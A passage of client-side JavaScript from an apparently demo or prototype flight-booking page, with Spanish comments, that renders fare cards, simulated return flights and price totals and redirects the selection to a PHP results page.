    if (!detailsSection) return;
    detailsSection.classList.toggle('hidden');
    cardElement.classList.toggle('expanded');
  };

  window.openTariffDetailModal = function(tariffType, flightPrice) {
    const modal = document.getElementById('tariffDetailModal');
    const key = String(tariffType || '').toLowerCase().trim();
    const tariffContent = tariffDetailsContent[key];
    const tariffFactor  = tariffPriceFactors[key];
    if (!tariffContent || !tariffFactor) {
      console.error('Unknown tariffType in modal:', tariffType);
      return;
    }

    const calculatedPrice = flightPrice * tariffFactor;
    modal.querySelector('.tariff-name').textContent  = tariffContent.name;
    modal.querySelector('.tariff-price').textContent = formatPriceCopJS(calculatedPrice);

    const includesContainer = modal.querySelector('.modal-body .include-items-container');
    includesContainer.innerHTML = '';
    tariffContent.includes.forEach(item => {
      const div = document.createElement('div');
      div.className = 'include-item';
      div.innerHTML = `
        <img src="${item.icon}" alt="${item.title} Icon">
        <div class="item-text">
          <p><strong>${item.title}</strong></p>
          ${item.description ? `<p>${item.description}</p>` : ''}
        </div>`;
      includesContainer.appendChild(div);
    });

    const extrasContainer = modal.querySelector('.modal-body .extra-items-container');
    extrasContainer.innerHTML = '';
    tariffContent.extras.forEach(item => {
      const div = document.createElement('div');
      div.className = 'extra-item';
      div.innerHTML = `
        <img src="${item.icon}" alt="${item.title} Icon">
        <div class="item-text">
          <p><strong>${item.title}</strong> ${item.subtitle ? item.subtitle : ''}</p>
          ${item.description ? `<p>${item.description}</p>` : ''}
        </div>`;
      extrasContainer.appendChild(div);
    });

    modal.classList.remove('hidden');
    document.body.classList.add('modal-open');
  };

  window.closeTariffDetailModal = function() {
    const modal = document.getElementById('tariffDetailModal');
    modal.classList.add('hidden');
    document.body.classList.remove('modal-open');
  };

window.selectOutboundFlight = function (flightIndex, tariffType) {
  // cerrar modal si estaba abierto
  window.closeTariffDetailModal?.();

  const flight = allFlightsData[flightIndex];
  if (!flight) { console.error('Flight not found for index:', flightIndex); return; }

  const key = String(tariffType || '').toLowerCase().trim();
  const tariffInfo = tariffDetailsContent[key];
  if (!tariffInfo) { console.error('Unknown tariffType:', key); return; }

  selectedOutboundFlight = {
    ...flight,
    selectedTariff: key,
    selectedPrice: flight.price * tariffPriceFactors[key]
  };

  // Resumen de IDA
  document.getElementById('summaryTariffType').textContent = tariffInfo.name;
  document.getElementById('summaryDate').textContent       = (__sp.get('departure-date') || '—');
  document.getElementById('summaryDepTime').textContent    = flight.dep_time;
  document.getElementById('summaryDepAirport').textContent = flight.dep_airport;
  document.getElementById('summaryArrTime').textContent    = flight.arr_time;
  document.getElementById('summaryArrAirport').textContent = flight.arr_airport;
  document.getElementById('summaryAirline').textContent    = flight.airline;
  document.getElementById('summaryStopLabel').textContent  = stops_label_js(flight.stops);
  document.getElementById('summaryDuration').textContent   = flight.duration;
  document.getElementById('summaryPrice').textContent      = formatPriceCopJS(selectedOutboundFlight.selectedPrice);

  // Mostrar secciones base
  document.getElementById('initialFlightResults').classList.add('hidden');
  document.getElementById('travelSummarySection').classList.remove('hidden');

  // Flujo: SOLO IDA
  if (ONE_WAY) {
    hideReturnSelectionUI();

    const totalFlightsPrice = selectedOutboundFlight.selectedPrice * PASSENGERS_COUNT;
    const totalTaxesFees    = Math.round(totalFlightsPrice * 0.20);
    const totalSubtotal     = totalFlightsPrice + totalTaxesFees;

    document.getElementById('totalFlightsPrice').textContent = formatPriceCopJS(totalFlightsPrice);
    document.getElementById('totalTaxesFees').textContent    = formatPriceCopJS(totalTaxesFees);
    document.getElementById('totalSubtotal').textContent     = formatPriceCopJS(totalSubtotal);

    document.getElementById('totalPriceSummaryContainer').classList.remove('hidden');
    document.getElementById('continueButtonContainer').classList.remove('hidden');
    document.getElementById('continueButtonContainer').scrollIntoView({behavior:'smooth', block:'center'});
    return;
  }

  // Flujo: IDA Y VUELTA
  showReturnSelectionUI();
  // Mantener oculto el resumen de vuelta hasta elegir
  const rsc = document.getElementById('returnSummaryCard');
  if (rsc) { rsc.classList.add('hidden'); rsc.style.display='none'; }

  document.getElementById('totalPriceSummaryContainer').classList.add('hidden');
  document.getElementById('continueButtonContainer').classList.add('hidden');
  generateAndDisplayReturnFlights();
};

// Redirige a partials/resultados-vuelos.php con todos los datos
window.continueBooking = function () {
  if (!selectedOutboundFlight) {
    alert('Debes seleccionar tu vuelo de ida.');
    return;
  }

  // Parámetros originales de la búsqueda (si existen en la URL)
  const sp = new URLSearchParams(window.location.search);

  const payload = {
    // Params esperados por resultados-vuelos.php
    origin:           sp.get('origin')           || '',
    destination:      sp.get('destination')      || '',
    'departure-date': sp.get('departure-date')   || '',
    'return-date':    sp.get('return-date')      || '',
    passengers:       sp.get('passengers')       || '1 adulto',
    cabin:            sp.get('cabin')            || 'Economy',
    promo_code:       sp.get('promo_code')       || '',

    // ===== Detalle IDA =====
    out_dep_time:     selectedOutboundFlight.dep_time,
    out_dep_airport:  selectedOutboundFlight.dep_airport,
    out_arr_time:     selectedOutboundFlight.arr_time,
    out_arr_airport:  selectedOutboundFlight.arr_airport,
    out_duration:     selectedOutboundFlight.duration,
    out_stops:        selectedOutboundFlight.stops,
    out_airline:      selectedOutboundFlight.airline,
    out_tariff:       selectedOutboundFlight.selectedTariff, // basic|light|full|premium
    out_price:        Math.round(selectedOutboundFlight.selectedPrice),

    // Totales (se recalculan por si acaso en PHP también)
    total_flights: 0,
    total_taxes:   0,
    total:         0
  };

  // ===== Detalle VUELTA (si existe) =====
  if (selectedReturnFlight) {
    payload.ret_dep_time    = selectedReturnFlight.dep_time;
    payload.ret_dep_airport = selectedReturnFlight.dep_airport;
    payload.ret_arr_time    = selectedReturnFlight.arr_time;
    payload.ret_arr_airport = selectedReturnFlight.arr_airport;
    payload.ret_duration    = selectedReturnFlight.duration;
    payload.ret_stops       = selectedReturnFlight.stops;
    payload.ret_airline     = selectedReturnFlight.airline;
    payload.ret_tariff      = selectedReturnFlight.selectedTariff;
    payload.ret_price       = Math.round(selectedReturnFlight.selectedPrice);
  }

  // Ajuste explícito para SOLO IDA
  if (ONE_WAY) {
    payload['return-date'] = '';
    ['ret_dep_time','ret_dep_airport','ret_arr_time','ret_arr_airport','ret_duration','ret_stops','ret_airline','ret_tariff','ret_price']
      .forEach(k => delete payload[k]);
  }

  // Totales
// Totales
  const totalFlightsPrice = ((selectedOutboundFlight?.selectedPrice || 0) + (selectedReturnFlight?.selectedPrice || 0)) * PASSENGERS_COUNT;
  const taxes             = Math.round(totalFlightsPrice * 0.20);
  const subtotal          = totalFlightsPrice + taxes;

  payload.total_flights = Math.round(totalFlightsPrice);
  payload.total_taxes   = taxes;
  payload.total         = subtotal;


  // Redirección con querystring
  const qs = new URLSearchParams(payload).toString();
  window.location.href = `partials/resultados-vuelos.php?${qs}`;
};

window.selectReturnFlight = function (returnFlightIndex, tariffType) {
  // cerrar modal si estaba abierto
  window.closeTariffDetailModal?.();

  const data = simulatedReturnFlights[returnFlightIndex];
  if (!data) { console.error('Return flight not found:', returnFlightIndex); return; }

  const key = String(tariffType || '').toLowerCase().trim();
  const tariffInfo = tariffDetailsContent[key];
  if (!tariffInfo) { console.error('Unknown tariffType:', key); return; }

  selectedReturnFlight = {
    ...data,
    selectedTariff: key,
    selectedPrice: data.price * tariffPriceFactors[key]
  };

  // Resumen de VUELTA
  document.getElementById('summaryReturnTariffType').textContent = tariffInfo.name;
  document.getElementById('summaryReturnDate').textContent       = (__sp.get('return-date') || '—');
  document.getElementById('summaryReturnDepTime').textContent    = data.dep_time;
  document.getElementById('summaryReturnDepAirport').textContent = data.dep_airport;
  document.getElementById('summaryReturnArrTime').textContent    = data.arr_time;
  document.getElementById('summaryReturnArrAirport').textContent = data.arr_airport;
  document.getElementById('summaryReturnAirline').textContent    = data.airline;
  document.getElementById('summaryReturnStopLabel').textContent  = stops_label_js(data.stops);
  document.getElementById('summaryReturnDuration').textContent   = data.duration;
  document.getElementById('summaryReturnPrice').textContent      = formatPriceCopJS(selectedReturnFlight.selectedPrice);

  // Mostrar el card de resumen de vuelta ahora sí
  const rsc = document.getElementById('returnSummaryCard');
  if (rsc) { rsc.classList.remove('hidden'); rsc.style.display=''; }

  // Totales
  const totalFlightsPrice = (selectedOutboundFlight.selectedPrice + selectedReturnFlight.selectedPrice) * PASSENGERS_COUNT;
  const totalTaxesFees    = Math.round(totalFlightsPrice * 0.20);
  const totalSubtotal     = totalFlightsPrice + totalTaxesFees;

  document.getElementById('totalFlightsPrice').textContent = formatPriceCopJS(totalFlightsPrice);
  document.getElementById('totalTaxesFees').textContent    = formatPriceCopJS(totalTaxesFees);
  document.getElementById('totalSubtotal').textContent     = formatPriceCopJS(totalSubtotal);

  // Ocultar controles/lista de vuelta y dejar sólo resúmenes + totales + continuar
  const list = document.getElementById('returnFlightCardsList');
  if (list) { list.innerHTML = ''; list.classList.add('hidden'); list.style.display = 'none'; }

  ['returnFlightsTitle','returnFlightsSort','returnFlightsOrderInfo'].forEach(id=>{
    const el=document.getElementById(id); if(el){ el.classList.add('hidden'); el.style.display='none'; }
  });

  const moreInfo = document.querySelector('#travelSummarySection .more-info-link');
  if (moreInfo){ moreInfo.classList.add('hidden'); moreInfo.style.display='none'; }

  document.getElementById('initialFlightResults')?.classList.add('hidden');

  document.querySelectorAll('.flight-card.expanded').forEach(card=>{
    card.classList.remove('expanded');
    card.querySelector('.flight-details-expanded')?.classList.add('hidden');
  });

  document.getElementById('totalPriceSummaryContainer').classList.remove('hidden');
  document.getElementById('continueButtonContainer').classList.remove('hidden');
  document.getElementById('continueButtonContainer').scrollIntoView({behavior:'smooth', block:'center'});
};


  // === ÚNICA versión de reset ===
  window.resetFlightSelection = function() {
    selectedOutboundFlight = null;
    selectedReturnFlight   = null;

    // Mostrar lista inicial (ida)
    document.getElementById('initialFlightResults').classList.remove('hidden');

    // Ocultar resumen + totales + continuar
    document.getElementById('travelSummarySection').classList.add('hidden');
    document.getElementById('totalPriceSummaryContainer').classList.add('hidden');
    document.getElementById('continueButtonContainer').classList.add('hidden');

    // Vaciar y volver a mostrar la lista de vuelta y sus controles
    const list = document.getElementById('returnFlightCardsList');
    if (list) {
      list.innerHTML = '';
      list.classList.remove('hidden');
      list.style.display = ''; // por si quedó 'none'
    }

    const t = document.getElementById('returnFlightsTitle');
    const s = document.getElementById('returnFlightsSort');
    const o = document.getElementById('returnFlightsOrderInfo');

    if (t) { t.classList.remove('hidden'); t.style.display = ''; }
    if (s) { s.classList.remove('hidden'); s.style.display = ''; }
    if (o) { o.classList.remove('hidden'); o.style.display = ''; }

    // Volver a mostrar el link “Más información…”
    const moreInfo = document.querySelector('#travelSummarySection .more-info-link');
    if (moreInfo) { moreInfo.classList.remove('hidden'); moreInfo.style.display = ''; }
  };

  // =========================
  //  Render de vuelos de vuelta
  // =========================
  
  function generateAndDisplayReturnFlights() {
    const container = document.getElementById('returnFlightCardsList');
    container.innerHTML = '';

    simulatedReturnFlights = [
      { badge:'Recomendado',  dep_time:'5:00 a. m.',  dep_airport:selectedOutboundFlight.arr_airport, arr_time:'6:07 a. m.',  arr_airport:selectedOutboundFlight.dep_airport, duration:'1 h 7 min',  stops:0, price: Math.round(selectedOutboundFlight.selectedPrice * 0.6),  airline:'LATAM Airlines Colombia', airline_logo:'https://placehold.co/16x16/E5E7EB/E5E7EB?text=Logo', details_url:'#' },
      { badge:'Más económico', dep_time:'7:00 a. m.',  dep_airport:selectedOutboundFlight.arr_airport, arr_time:'8:15 a. m.',  arr_airport:selectedOutboundFlight.dep_airport, duration:'1 h 15 min', stops:0, price: Math.round(selectedOutboundFlight.selectedPrice * 0.55), airline:'LATAM Airlines Colombia', airline_logo:'https://placehold.co/16x16/E5E7EB/E5E7EB?text=Logo', details_url:'#' },
      { badge:'',             dep_time:'10:00 a. m.', dep_airport:selectedOutboundFlight.arr_airport, arr_time:'11:30 a. m.', arr_airport:selectedOutboundFlight.dep_airport, duration:'1 h 30 min', stops:1, price: Math.round(selectedOutboundFlight.selectedPrice * 0.7),  airline:'LATAM Airlines Colombia', airline_logo:'https://placehold.co/16x16/E5E7EB/E5E7EB?text=Logo', details_url:'#' }
    ];

    simulatedReturnFlights.forEach((f, index) => {
      const baseP    = formatPriceCopJS(f.price);
      const basicP   = formatPriceCopJS(f.price * tariffPriceFactors.basic);
      const lightP   = formatPriceCopJS(f.price * tariffPriceFactors.light);
      const fullP    = formatPriceCopJS(f.price * tariffPriceFactors.full);
      const premiumP = formatPriceCopJS(f.price * tariffPriceFactors.premium);
      const stopsLbl = stops_label_js(f.stops);

      const article = document.createElement('article');
      article.className = 'flight-card';
      article.onclick = () => window.toggleFlightDetails(article);

      article.innerHTML = `
        <div class="flight-card-header">
          ${f.badge ? `<span class="tag-economico">${f.badge}</span>` : ''}
        </div>
        <div class="flight-card-body">
          <div class="flight-times departure-mobile"><div class="time">${f.dep_time}</div><div class="airport-code">${f.dep_airport}</div></div>
          <div class="flight-duration mobile-duration"><span class="duration-text">Duración</span><span class="duration-value">${f.duration}</span></div>
          <div class="flight-times arrival-mobile"><div class="time">${f.arr_time}</div><div class="airport-code">${f.arr_airport}</div></div>

          <div class="desktop-flight-info">
            <div class="flight-times departure-desktop"><div class="time">${f.dep_time}</div><div class="airport-code">${f.dep_airport}</div></div>
            <div class="connection-line"><div class="flight-duration desktop-duration"><span class="duration-text">Duración</span><span class="duration-value">${f.duration}</span></div></div>
            <div class="flight-times arrival-desktop"><div class="time">${f.arr_time}</div><div class="airport-code">${f.arr_airport}</div></div>
          </div>

          <div class="flight-price-desktop">
            <span class="price-label">Por persona desde</span>
            <span class="price-value">${baseP}</span>
            <span class="tax-info">Incluye tasas e impuestos</span>
          </div>
        </div>

        <div class="flight-card-footer">
          <a class="stops-info" href="${f.details_url}">${stopsLbl}</a>
          <div class="operated-by"><span>Operado por <img src="${f.airline_logo}" class="latam-logo-small" alt=""> <strong>${f.airline}</strong></span></div>
          <div class="flight-price-mobile"><span class="price-label">Por persona desde</span><span class="price-value">${baseP}</span></div>
        </div>

        <div class="flight-details-expanded hidden">
          <div class="expanded-header">
            <span class="aircraft-info">Airbus A320 Incluye <img src="../assets/img/capa 10.png" alt=""> <img src="https://placehold.co/16x16/E5E7EB/E5E7EB?text=Power" alt=""> <img src="https://placehold.co/16x16/E5E7EB/E5E7EB?text=USB" alt=""></span>
            <div class="tariff-summary">
              <span>4 Tarifas disponibles</span>
              <button class="close-expanded-btn" onclick="event.stopPropagation(); window.toggleFlightDetails(this.closest('.flight-card'));">Cerrar X</button>
            </div>
          </div>

          <div class="tariff-cards-container">
            <div class="tariff-card basic-tariff">
              <div class="tariff-card-header">Basic</div>
              <div class="tariff-card-body">
                <ul>
                  <li><span class="icon-check">✅</span> Bolso o mochila pequeña</li>
                  <li><span class="icon-cross">❌</span> Cambio con cargo + diferencia de precio</li>
                  <li><span class="icon-cross">❌</span> No aplican beneficios por categorías de socios</li>
                </ul>
              </div>
              <div class="tariff-card-footer">
                <span class="price-value">${basicP}</span>
                <span class="price-label">Por pasajero</span>
                <span class="tax-info">Incluye tasas e impuestos</span>
                <a href="#" class="details-link" onclick="event.stopPropagation(); window.openTariffDetailModal('basic', ${f.price});">Más detalles</a>
                <button class="choose-tariff-btn" onclick="event.stopPropagation(); window.selectReturnFlight(${index}, 'basic');">Elegir</button>
              </div>
            </div>

            <div class="tariff-card light-tariff">
              <div class="tariff-card-header">Light</div>
              <div class="tariff-card-body">
                <ul>
                  <li><span class="icon-check">✅</span> Bolso o mochila pequeña</li>
                  <li><span class="icon-check">✅</span> Equipaje de mano 12 kg</li>
                  <li><span class="icon-check">✅</span> Cambio con cargo + diferencia de precio</li>
                  <li><span class="icon-cross">❌</span> Postulación a UPG con tramos</li>
                </ul>
              </div>
              <div class="tariff-card-footer">
                <span class="price-value">${lightP}</span>
                <span class="price-label">Por pasajero</span>
                <span class="tax-info">Incluye tasas e impuestos</span>
                <a href="#" class="details-link" onclick="event.stopPropagation(); window.openTariffDetailModal('light', ${f.price});">Más detalles</a>
                <button class="choose-tariff-btn" onclick="event.stopPropagation(); window.selectReturnFlight(${index}, 'light');">Elegir</button>
              </div>
            </div>

            <div class="tariff-card full-tariff">
              <div class="tariff-card-header">Full</div>
              <div class="tariff-card-body">
                <ul>
                  <li><span class="icon-check">✅</span> Bolso o mochila pequeña</li>
                  <li><span class="icon-check">✅</span> Equipaje de mano 12 kg</li>
                  <li><span class="icon-check">✅</span> 1 equipaje de bodega 23 kg</li>
                  <li><span class="icon-check">✅</span> Cambio sin cargo + diferencia de precio</li>
                  <li><span class="icon-check">✅</span> Devolución antes de la salida del primer vuelo</li>
                  <li><span class="icon-check">✅</span> Selección de asiento Estándar</li>
                  <li><span class="icon-cross">❌</span> Postulación a UPG con tramos</li>
                </ul>
              </div>
              <div class="tariff-card-footer">
                <span class="price-value">${fullP}</span>
                <span class="price-label">Por pasajero</span>
                <span class="tax-info">Incluye tasas e impuestos</span>
                <a href="#" class="details-link" onclick="event.stopPropagation(); window.openTariffDetailModal('full', ${f.price});">Más detalles</a>
                <button class="choose-tariff-btn" onclick="event.stopPropagation(); window.selectReturnFlight(${index}, 'full');">Elegir</button>
              </div>
            </div>

            <div class="tariff-card premium-tariff">
              <div class="premium-economy-tag">Cabina Premium Economy</div>
              <div class="tariff-card-header">Premium Economy</div>
              <div class="tariff-card-body">
                <ul>
                  <li><span class="icon-check">✅</span> Bolso o mochila pequeña</li>
                  <li><span class="icon-check">✅</span> Equipaje de mano 16 kg</li>
                  <li><span class="icon-check">✅</span> 1 equipaje de bodega 23 kg</li>
                  <li><span class="icon-check">✅</span> Cambio sin cargo + diferencia de precio</li>
                  <li><span class="icon-check">✅</span> Devolución antes de la salida del primer vuelo</li>
                  <li><span class="icon-check">✅</span> Asiento del medio bloqueado</li>
                  <li><span class="icon-check">✅</span> Mejor oferta gastronómica</li>
                  <li><span class="icon-check">✅</span> Más espacio para tus piernas</li>
                  <li><span class="icon-check">✅</span> Embarque y desembarque prioritario</li>
                </ul>
              </div>
              <div class="tariff-card-footer">
                <span class="price-value">${premiumP}</span>
                <span class="price-label">Por pasajero</span>
                <span class="tax-info">Incluye tasas e impuestos</span>
                <a href="#" class="details-link" onclick="event.stopPropagation(); window.openTariffDetailModal('premium', ${f.price});">Más detalles</a>
                <button class="choose-tariff-btn" onclick="event.stopPropagation(); window.selectReturnFlight(${index}, 'premium');">Elegir</button>
              </div>
            </div>
          </div>
        </div>
      `;

      container.appendChild(article);
    });
  }

  // =========================
  //  Cerrar tarjetas al hacer click fuera (respeta el modal)
  // =========================
  document.addEventListener('click', function(event) {
    const modal = document.getElementById('tariffDetailModal');
    if (event.target.closest('#tariffDetailModal')) return;

    document.querySelectorAll('.flight-card.expanded').forEach(card => {
      if (!card.contains(event.target)) {
        const details = card.querySelector('.flight-details-expanded');
        if (details && !details.classList.contains('hidden')) {
          details.classList.add('hidden');
          card.classList.remove('expanded');
        }
      }
    });
  });

  // Para depurar:
  // console.log('tariff keys:', Object.keys(tariffDetailsContent));
</script>